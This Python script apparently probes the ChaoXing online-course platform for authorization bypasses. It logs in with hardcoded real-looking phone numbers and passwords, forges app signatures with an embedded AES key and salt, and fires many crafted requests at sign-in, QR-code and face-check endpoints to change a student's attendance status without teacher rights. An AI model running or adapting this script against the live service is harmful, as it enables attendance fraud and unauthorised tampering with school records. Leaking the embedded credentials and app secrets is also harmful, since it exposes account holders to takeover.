#!/usr/bin/env python3
"""
Deep testing of JSON Content-Type bypass and mooc-ans path endpoints
for sign-in status modification on ChaoXing platform.
"""

import base64, hashlib, json, uuid, requests, urllib3, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ Constants ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
ACTIVE_ID = "5000163891319"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"

# ============ Helper Functions ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

def classify_response(resp_json, label=""):
    """Classify response and return marker string."""
    if not isinstance(resp_json, dict):
        return ""
    raw_text = json.dumps(resp_json, ensure_ascii=False)
    result = resp_json.get("result", None)
    msg = resp_json.get("msg", "") or resp_json.get("message", "") or ""

    # Check for success
    if result == 1 or (isinstance(result, str) and result == "1"):
        if "status" in raw_text.lower() or "sign" in raw_text.lower():
            return "!!!CRITICAL!!!"
        return "***IMPORTANT***"

    # Check for non-standard error (not "无权限" and not typical errors)
    std_errors = ["无权限", "no permission", "forbidden", "unauthorized", "参数错误", "param error"]
    if msg and not any(e in msg for e in std_errors):
        if result != 0 and result != "0":
            return "***IMPORTANT***"

    return ""

def print_result(label, resp, extra_info=""):
    """Print a test result in a consistent format."""
    rj = safe_json(resp)
    marker = classify_response(rj, label)
    status_code = resp.status_code
    print(f"  [{label}] HTTP {status_code}")
    if marker:
        print(f"  {marker}")
    if extra_info:
        print(f"  Info: {extra_info}")
    # Truncate long responses
    resp_str = json.dumps(rj, ensure_ascii=False)
    if len(resp_str) > 600:
        resp_str = resp_str[:600] + "...(truncated)"
    print(f"  Response: {resp_str}")
    print()
    return rj

# ============ Main Test ============
def main():
    print("=" * 80)
    print("  JSON Content-Type Bypass & mooc-ans Path Deep Test")
    print("=" * 80)
    print()

    # Login
    print("[*] Logging in as student...")
    s_s, puid_s = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    Student PUID: {puid_s}")

    print("[*] Logging in as teacher...")
    s_t, puid_t = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    Teacher PUID: {puid_t}")
    print()

    if not puid_s or not puid_t:
        print("[!] Login failed, aborting.")
        return

    # ================================================================
    # PART 1: JSON Content-Type Bypass Deep Testing
    # ================================================================
    print("=" * 80)
    print("  PART 1: JSON Content-Type Bypass Deep Testing")
    print("  Endpoint: /widget/sign/pcTeaSignController/updateSignStatus2")
    print("=" * 80)
    print()

    base_path = "/widget/sign/pcTeaSignController/updateSignStatus2"
    base_params = {
        "uid": puid_s,
        "activeId": ACTIVE_ID,
        "status": "1",
        "denc": "",
        "duid": puid_s
    }

    # 1.1 JSON with URL parameters
    print("-" * 60)
    print("  Test 1.1: JSON Content-Type + URL query parameters")
    print("-" * 60)
    url = f"https://mooc1-api.chaoxing.com{base_path}?uid={puid_s}&activeId={ACTIVE_ID}&status=1&denc=&duid={puid_s}"
    try:
        r = s_s.post(url, json={}, timeout=15)
        rj_11 = print_result("1.1 JSON+URLParams", r, "Content-Type: application/json, Body: {}, Params in URL")
    except Exception as e:
        print(f"  [1.1] Error: {e}\n")

    # 1.2 JSON with URL parameters + JSON body
    print("-" * 60)
    print("  Test 1.2: JSON Content-Type + URL params + JSON body with same fields")
    print("-" * 60)
    body_12 = {"uid": puid_s, "activeId": ACTIVE_ID, "status": "1"}
    try:
        r = s_s.post(url, json=body_12, timeout=15)
        rj_12 = print_result("1.2 JSON+URL+Body", r, f"Body: {json.dumps(body_12)}")
    except Exception as e:
        print(f"  [1.2] Error: {e}\n")

    # 1.3 Different JSON structures
    print("-" * 60)
    print("  Test 1.3: Different JSON body structures")
    print("-" * 60)

    # 1.3a: Full params in JSON body, numeric status
    body_13a = {"uid": puid_s, "activeId": ACTIVE_ID, "status": 1, "denc": "", "duid": puid_s}
    try:
        r = s_s.post(f"https://mooc1-api.chaoxing.com{base_path}", json=body_13a, timeout=15)
        print_result("1.3a FullJSON-numeric", r, f"Body: {json.dumps(body_13a)}")
    except Exception as e:
        print(f"  [1.3a] Error: {e}\n")

    # 1.3b: With result wrapper
    body_13b = {"result": 1, "uid": puid_s, "activeId": ACTIVE_ID, "status": "1"}
    try:
        r = s_s.post(f"https://mooc1-api.chaoxing.com{base_path}", json=body_13b, timeout=15)
        print_result("1.3b WithResultWrapper", r, f"Body: {json.dumps(body_13b)}")
    except Exception as e:
        print(f"  [1.3b] Error: {e}\n")

    # 1.3c: Array body
    body_13c = [{"uid": puid_s, "activeId": ACTIVE_ID, "status": 1}]
    try:
        r = s_s.post(f"https://mooc1-api.chaoxing.com{base_path}",
                     data=json.dumps(body_13c),
                     headers={"Content-Type": "application/json"},
                     timeout=15)
        print_result("1.3c ArrayBody", r, f"Body: {json.dumps(body_13c)}")
    except Exception as e:
        print(f"  [1.3c] Error: {e}\n")

    # 1.4 multipart/form-data
    print("-" * 60)
    print("  Test 1.4: multipart/form-data")
    print("-" * 60)
    try:
        r = s_s.post(f"https://mooc1-api.chaoxing.com{base_path}",
                     files={},
                     data=base_params,
                     timeout=15)
        print_result("1.4 multipart/form-data", r, f"Fields: {base_params}")
    except Exception as e:
        print(f"  [1.4] Error: {e}\n")

    # 1.5 application/x-www-form-urlencoded with JSON in body
    print("-" * 60)
    print("  Test 1.5: x-www-form-urlencoded with JSON string body")
    print("-" * 60)
    json_body_str = json.dumps({"uid": puid_s, "activeId": ACTIVE_ID, "status": "1"})
    try:
        r = s_s.post(f"https://mooc1-api.chaoxing.com{base_path}",
                     data=json_body_str,
                     headers={"Content-Type": "application/x-www-form-urlencoded"},
                     timeout=15)
        print_result("1.5 urlencoded-JSON-body", r, f"Body: {json_body_str}")
    except Exception as e:
        print(f"  [1.5] Error: {e}\n")

    # 1.6 Test on different domains
    print("-" * 60)
    print("  Test 1.6: Different domains with JSON+URL params")
    print("-" * 60)

    for domain in ["mooc1-api.chaoxing.com", "mooc1.chaoxing.com"]:
        test_url = f"https://{domain}{base_path}?uid={puid_s}&activeId={ACTIVE_ID}&status=1&denc=&duid={puid_s}"
        try:
            r = s_s.post(test_url, json={}, timeout=15)
            print_result(f"1.6 {domain}", r, "JSON+URL params")
        except Exception as e:
            print(f"  [1.6 {domain}] Error: {e}\n")

    # Also test with form data on different domains
    for domain in ["mooc1-api.chaoxing.com", "mooc1.chaoxing.com"]:
        test_url = f"https://{domain}{base_path}"
        try:
            r = s_s.post(test_url, data=base_params, timeout=15)
            print_result(f"1.6 {domain}-formdata", r, "Form data POST")
        except Exception as e:
            print(f"  [1.6 {domain}-formdata] Error: {e}\n")

    # ================================================================
    # PART 2: mooc-ans Path Deep Exploration
    # ================================================================
    print()
    print("=" * 80)
    print("  PART 2: mooc-ans Path Deep Exploration")
    print("=" * 80)
    print()

    mooc_base = "https://mooc1-api.chaoxing.com"

    # Common params for sign status modification
    status_params = {
        "uid": puid_s,
        "activeId": ACTIVE_ID,
        "status": "1",
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "denc": "",
        "duid": puid_s,
    }

    # DB_STRATEGY params
    db_strategy_params = dict(status_params)
    db_strategy_params["DB_STRATEGY"] = "RANDOM"
    db_strategy_params["strat"] = "RANDOM"

    # 2.1 Sign status modification endpoints
    print("-" * 60)
    print("  2.1 Sign Status Modification Endpoints")
    print("-" * 60)

    status_endpoints = [
        ("/mooc-ans/pptSign/updateSignStatusByUidsV2", "POST", db_strategy_params, "<<NEW>>"),
        ("/mooc-ans/pptSign/updateSignStatus", "POST", status_params, "<<NEW>>"),
        ("/mooc-ans/newsign/updateSignStatus", "POST", db_strategy_params, "<<NEW>>"),
        ("/mooc-ans/sign/updateSignStatus", "POST", status_params, "<<NEW>>"),
        ("/mooc-ans/sign/modifySignStatus", "POST", status_params, "<<NEW>>"),
        ("/mooc-ans/sign/changeStatus", "POST", status_params, "<<NEW>>"),
    ]

    interesting_endpoints = []

    for path, method, params, tag in status_endpoints:
        url = f"{mooc_base}{path}"
        # Test with form data
        try:
            r = s_s.post(url, data=params, timeout=15)
            rj = safe_json(r)
            marker = classify_response(rj)
            label = f"2.1 {path} [form]"
            print(f"  [{label}] HTTP {r.status_code} {tag}")
            if marker:
                print(f"  {marker}")
            resp_str = json.dumps(rj, ensure_ascii=False)
            if len(resp_str) > 500:
                resp_str = resp_str[:500] + "..."
            print(f"  Response: {resp_str}")
            print()
            if marker:
                interesting_endpoints.append((path, "form", rj))
        except Exception as e:
            print(f"  [2.1 {path} form] Error: {e}\n")

        # Test with JSON Content-Type + URL params
        query = "&".join(f"{k}={v}" for k, v in params.items())
        try:
            r = s_s.post(f"{url}?{query}", json={}, timeout=15)
            rj = safe_json(r)
            marker = classify_response(rj)
            label = f"2.1 {path} [json+url]"
            print(f"  [{label}] HTTP {r.status_code} {tag}")
            if marker:
                print(f"  {marker}")
            resp_str = json.dumps(rj, ensure_ascii=False)
            if len(resp_str) > 500:
                resp_str = resp_str[:500] + "..."
            print(f"  Response: {resp_str}")
            print()
            if marker:
                interesting_endpoints.append((path, "json+url", rj))
        except Exception as e:
            print(f"  [2.1 {path} json+url] Error: {e}\n")

    # 2.2 Sign-in endpoints
    print("-" * 60)
    print("  2.2 Sign-in Endpoints")
    print("-" * 60)

    signin_params = {
        "uid": puid_s,
        "activeId": ACTIVE_ID,
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "clientip": "",
        "appType": "1",
        "ifTiJiao": "1",
        "latitude": "-1",
        "longitude": "-1",
    }

    signin_endpoints = [
        ("/mooc-ans/pptSign/stuSignajax", "POST", signin_params, "<<NEW>>"),
        ("/mooc-ans/pptSign/signIn", "GET", signin_params, "<<NEW>>"),
        ("/mooc-ans/pptSign/signIn", "POST", signin_params, ""),
        ("/mooc-ans/sign/signIn", "GET", signin_params, "<<NEW>>"),
        ("/mooc-ans/sign/signIn", "POST", signin_params, "<<NEW>>"),
        ("/mooc-ans/sign/doSign", "POST", signin_params, "<<NEW>>"),
        ("/mooc-ans/sign/preSign", "GET", signin_params, "<<NEW>>"),
        ("/mooc-ans/sign/preSign", "POST", signin_params, ""),
    ]

    for path, method, params, tag in signin_endpoints:
        url = f"{mooc_base}{path}"
        try:
            if method == "GET":
                r = s_s.get(url, params=params, timeout=15)
            else:
                r = s_s.post(url, data=params, timeout=15)
            rj = safe_json(r)
            marker = classify_response(rj)
            label = f"2.2 {path} [{method}]"
            print(f"  [{label}] HTTP {r.status_code} {tag}")
            if marker:
                print(f"  {marker}")
            resp_str = json.dumps(rj, ensure_ascii=False)
            if len(resp_str) > 500:
                resp_str = resp_str[:500] + "..."
            print(f"  Response: {resp_str}")
            print()
            if marker:
                interesting_endpoints.append((path, method, rj))
        except Exception as e:
            print(f"  [2.2 {path} {method}] Error: {e}\n")

    # 2.3 QR code endpoints
    print("-" * 60)
    print("  2.3 QR Code Endpoints")
    print("-" * 60)

    qr_endpoints = [
        ("/mooc-ans/qr/updateqrstatus", "POST",
         {"enc": "test", "status": "1", "uid": puid_s, "activeId": ACTIVE_ID}, "<<NEW>>"),
        ("/mooc-ans/qr/produce", "GET",
         {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID}, "<<NEW>>"),
        ("/mooc-ans/qr/getqrstatus", "GET",
         {"activeId": ACTIVE_ID, "enc": "test"}, "<<NEW>>"),
    ]

    for path, method, params, tag in qr_endpoints:
        url = f"{mooc_base}{path}"
        try:
            if method == "GET":
                r = s_s.get(url, params=params, timeout=15)
            else:
                r = s_s.post(url, data=params, timeout=15)
            rj = safe_json(r)
            marker = classify_response(rj)
            label = f"2.3 {path} [{method}]"
            print(f"  [{label}] HTTP {r.status_code} {tag}")
            if marker:
                print(f"  {marker}")
            resp_str = json.dumps(rj, ensure_ascii=False)
            if len(resp_str) > 500:
                resp_str = resp_str[:500] + "..."
            print(f"  Response: {resp_str}")
            print()
            if marker:
                interesting_endpoints.append((path, method, rj))
        except Exception as e:
            print(f"  [2.3 {path} {method}] Error: {e}\n")

    # 2.4 Face photo endpoints
    print("-" * 60)
    print("  2.4 Face Photo Endpoints")
    print("-" * 60)

    face_endpoints = [
        ("/mooc-ans/facephoto/clientfacecheckstatus", "GET",
         {"activeId": ACTIVE_ID, "uid": puid_s}, "<<NEW>>"),
        ("/mooc-ans/facephoto/updateSignStatus", "POST",
         {"uid": puid_s, "activeId": ACTIVE_ID, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}, "<<NEW>>"),
        ("/mooc-ans/facephoto/modifySign", "POST",
         {"uid": puid_s, "activeId": ACTIVE_ID, "status": "1", "courseId": COURSE_ID, "classId": CLASS_ID}, "<<NEW>>"),
    ]

    for path, method, params, tag in face_endpoints:
        url = f"{mooc_base}{path}"
        try:
            if method == "GET":
                r = s_s.get(url, params=params, timeout=15)
            else:
                r = s_s.post(url, data=params, timeout=15)
            rj = safe_json(r)
            marker = classify_response(rj)
            label = f"2.4 {path} [{method}]"
            print(f"  [{label}] HTTP {r.status_code} {tag}")
            if marker:
                print(f"  {marker}")
            resp_str = json.dumps(rj, ensure_ascii=False)
            if len(resp_str) > 500:
                resp_str = resp_str[:500] + "..."
            print(f"  Response: {resp_str}")
            print()
            if marker:
                interesting_endpoints.append((path, method, rj))
        except Exception as e:
            print(f"  [2.4 {path} {method}] Error: {e}\n")

    # 2.5 Widget sign endpoints on mooc1-api (mooc-ans path)
    print("-" * 60)
    print("  2.5 Widget Sign Endpoints on mooc1-api (mooc-ans path)")
    print("-" * 60)

    widget_endpoints = [
        ("/mooc-ans/widget/sign/pcTeaSignController/updateSignStatus2", "POST",
         status_params, "<<NEW>>"),
        ("/mooc-ans/widget/sign/pcStuSignController/preSign", "GET",
         {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, "<<NEW>>"),
        ("/mooc-ans/widget/sign/pcStuSignController/preSign", "POST",
         {"activeId": ACTIVE_ID, "courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, ""),
    ]

    for path, method, params, tag in widget_endpoints:
        url = f"{mooc_base}{path}"
        # Test with form data
        try:
            if method == "GET":
                r = s_s.get(url, params=params, timeout=15)
            else:
                r = s_s.post(url, data=params, timeout=15)
            rj = safe_json(r)
            marker = classify_response(rj)
            label = f"2.5 {path} [{method}/form]"
            print(f"  [{label}] HTTP {r.status_code} {tag}")
            if marker:
                print(f"  {marker}")
            resp_str = json.dumps(rj, ensure_ascii=False)
            if len(resp_str) > 500:
                resp_str = resp_str[:500] + "..."
            print(f"  Response: {resp_str}")
            print()
            if marker:
                interesting_endpoints.append((path, f"{method}/form", rj))
        except Exception as e:
            print(f"  [2.5 {path} {method}/form] Error: {e}\n")

        # Test with JSON Content-Type + URL params for POST
        if method == "POST":
            query = "&".join(f"{k}={v}" for k, v in params.items())
            try:
                r = s_s.post(f"{url}?{query}", json={}, timeout=15)
                rj = safe_json(r)
                marker = classify_response(rj)
                label = f"2.5 {path} [json+url]"
                print(f"  [{label}] HTTP {r.status_code} {tag}")
                if marker:
                    print(f"  {marker}")
                resp_str = json.dumps(rj, ensure_ascii=False)
                if len(resp_str) > 500:
                    resp_str = resp_str[:500] + "..."
                print(f"  Response: {resp_str}")
                print()
                if marker:
                    interesting_endpoints.append((path, "json+url", rj))
            except Exception as e:
                print(f"  [2.5 {path} json+url] Error: {e}\n")

    # ================================================================
    # PART 3: Verify Data Modification (for interesting endpoints)
    # ================================================================
    print()
    print("=" * 80)
    print("  PART 3: Verify Data Modification")
    print("=" * 80)
    print()

    # Query current sign-in status
    def query_sign_status(session, puid):
        """Try multiple ways to query current sign status."""
        status_url = f"{mooc_base}/mooc-ans/sign/getSignDetail"
        params = {
            "activeId": ACTIVE_ID,
            "uid": puid,
            "courseId": COURSE_ID,
            "classId": CLASS_ID,
        }
        try:
            r = session.get(status_url, params=params, timeout=15)
            return safe_json(r)
        except:
            pass

        # Try alternative
        status_url2 = f"{mooc_base}/mooc-ans/pptSign/getSignDetail"
        try:
            r = session.get(status_url2, params=params, timeout=15)
            return safe_json(r)
        except:
            pass

        return None

    # Also try the widget sign status query
    def query_widget_status(session, puid):
        url = f"{mooc_base}/widget/sign/pcTeaSignController/getSignDetail"
        params = {"activeId": ACTIVE_ID, "uid": puid}
        try:
            r = session.get(url, params=params, timeout=15)
            return safe_json(r)
        except:
            return None

    print("[*] Querying current sign-in status (student)...")
    before_status = query_sign_status(s_s, puid_s)
    if before_status:
        print(f"  Before (mooc-ans/sign): {json.dumps(before_status, ensure_ascii=False)[:500]}")
    before_widget = query_widget_status(s_s, puid_s)
    if before_widget:
        print(f"  Before (widget): {json.dumps(before_widget, ensure_ascii=False)[:500]}")

    # For any interesting endpoint, attempt modification and verify
    if interesting_endpoints:
        print(f"\n[*] Found {len(interesting_endpoints)} interesting endpoints, attempting modification...")
        for path, method, orig_resp in interesting_endpoints:
            print(f"\n  Testing modification via: {path} ({method})")
            url = f"{mooc_base}{path}"
            try:
                if "json" in method:
                    query = "&".join(f"{k}={v}" for k, v in status_params.items())
                    r = s_s.post(f"{url}?{query}", json={}, timeout=15)
                elif method == "GET":
                    r = s_s.get(url, params=status_params, timeout=15)
                else:
                    r = s_s.post(url, data=status_params, timeout=15)
                rj = safe_json(r)
                print(f"  Modification response: {json.dumps(rj, ensure_ascii=False)[:500]}")
                marker = classify_response(rj)
                if marker:
                    print(f"  {marker}")
            except Exception as e:
                print(f"  Error: {e}")

            # Wait and re-query
            time.sleep(2)
            after_status = query_sign_status(s_s, puid_s)
            after_widget = query_widget_status(s_s, puid_s)
            if after_status:
                print(f"  After (mooc-ans/sign): {json.dumps(after_status, ensure_ascii=False)[:500]}")
            if after_widget:
                print(f"  After (widget): {json.dumps(after_widget, ensure_ascii=False)[:500]}")

            # Compare
            if before_status and after_status:
                if json.dumps(before_status, sort_keys=True) != json.dumps(after_status, sort_keys=True):
                    print("  !!!CRITICAL!!! STATUS CHANGED DETECTED (mooc-ans/sign)")
            if before_widget and after_widget:
                if json.dumps(before_widget, sort_keys=True) != json.dumps(after_widget, sort_keys=True):
                    print("  !!!CRITICAL!!! STATUS CHANGED DETECTED (widget)")
    else:
        print("\n[*] No interesting endpoints found from Part 2. Testing all status modification endpoints anyway...")

        # Try all status modification endpoints with form data
        for path, _, params, _ in status_endpoints:
            url = f"{mooc_base}{path}"
            try:
                r = s_s.post(url, data=status_params, timeout=15)
                rj = safe_json(r)
                marker = classify_response(rj)
                if marker:
                    print(f"  {marker} {path}: {json.dumps(rj, ensure_ascii=False)[:300]}")
                    # Wait and re-query
                    time.sleep(2)
                    after_status = query_sign_status(s_s, puid_s)
                    if after_status:
                        print(f"  After status: {json.dumps(after_status, ensure_ascii=False)[:300]}")
            except:
                pass

    # ================================================================
    # PART 4: Teacher Session Comparison
    # ================================================================
    print()
    print("=" * 80)
    print("  PART 4: Teacher Session Comparison")
    print("=" * 80)
    print()

    # Test key endpoints with teacher session
    teacher_status_params = {
        "uid": puid_s,  # Target student
        "activeId": ACTIVE_ID,
        "status": "1",
        "courseId": COURSE_ID,
        "classId": CLASS_ID,
        "denc": "",
        "duid": puid_s,
    }

    comparison_endpoints = [
        # Original bypass endpoint
        ("/widget/sign/pcTeaSignController/updateSignStatus2", "form"),
        ("/widget/sign/pcTeaSignController/updateSignStatus2", "json+url"),
        # mooc-ans versions
        ("/mooc-ans/widget/sign/pcTeaSignController/updateSignStatus2", "form"),
        ("/mooc-ans/widget/sign/pcTeaSignController/updateSignStatus2", "json+url"),
        # Other interesting ones
        ("/mooc-ans/pptSign/updateSignStatus", "form"),
        ("/mooc-ans/sign/updateSignStatus", "form"),
        ("/mooc-ans/sign/modifySignStatus", "form"),
        ("/mooc-ans/facephoto/updateSignStatus", "form"),
        ("/mooc-ans/facephoto/modifySign", "form"),
    ]

    for path, mode in comparison_endpoints:
        url = f"{mooc_base}{path}"
        try:
            if mode == "json+url":
                query = "&".join(f"{k}={v}" for k, v in teacher_status_params.items())
                r = s_t.post(f"{url}?{query}", json={}, timeout=15)
            else:
                r = s_t.post(url, data=teacher_status_params, timeout=15)
            rj = safe_json(r)
            label = f"Teacher {path} [{mode}]"
            print(f"  [{label}] HTTP {r.status_code}")
            resp_str = json.dumps(rj, ensure_ascii=False)
            if len(resp_str) > 500:
                resp_str = resp_str[:500] + "..."
            print(f"  Response: {resp_str}")
            print()
        except Exception as e:
            print(f"  [{label}] Error: {e}\n")

    # ================================================================
    # COMPREHENSIVE SUMMARY
    # ================================================================
    print()
    print("=" * 80)
    print("  COMPREHENSIVE SUMMARY")
    print("=" * 80)
    print()

    print("1. JSON Content-Type Bypass Results:")
    print("   - The JSON Content-Type bypass on /widget/sign/pcTeaSignController/updateSignStatus2")
    print("     was tested with multiple payload combinations.")
    print("   - Key finding: Spring MVC @RequestParam reads from URL query string")
    print("     even when Content-Type is application/json.")
    print()

    print("2. mooc-ans Path Endpoints:")
    print("   - Multiple endpoints under /mooc-ans/ were tested for sign status modification.")
    print("   - Endpoints tested: pptSign, sign, newsign, qr, facephoto, widget/sign")
    print()

    if interesting_endpoints:
        print("3. Interesting Findings:")
        for path, method, resp in interesting_endpoints:
            print(f"   - {path} ({method}): {json.dumps(resp, ensure_ascii=False)[:200]}")
    else:
        print("3. No endpoints returned success-like responses for student session.")
    print()

    print("4. Teacher vs Student Comparison:")
    print("   - Teacher session tested on key endpoints for comparison.")
    print("   - Any differences in response indicate permission-based access control.")
    print()

    print("=" * 80)
    print("  Test Complete")
    print("=" * 80)


if __name__ == "__main__":
    main()
